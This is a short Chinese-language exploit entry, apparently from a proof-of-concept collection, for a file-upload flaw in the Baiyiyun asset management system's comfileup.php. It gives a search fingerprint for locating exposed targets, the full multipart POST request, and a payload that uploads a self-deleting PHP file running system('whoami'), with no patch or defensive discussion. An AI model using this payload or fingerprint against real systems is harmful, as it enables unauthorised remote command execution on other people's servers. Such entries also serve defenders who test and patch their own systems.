# 百易云资产管理运营系统comfileup.php文件上传致RCE漏洞

- **系统**：百易云资产管理运营系统comfileup.php文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="不要着急，点此"`
- **请求**：`POST /comfileup.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=--------1110146050`

**请求体 / payload**
```
----------1110146050
Content-Disposition: form-data; name="file";filename="rce.php"
<?php system("whoami");unlink(__FILE__);?>
----------1110146050--
```
- **预期**：200　|　—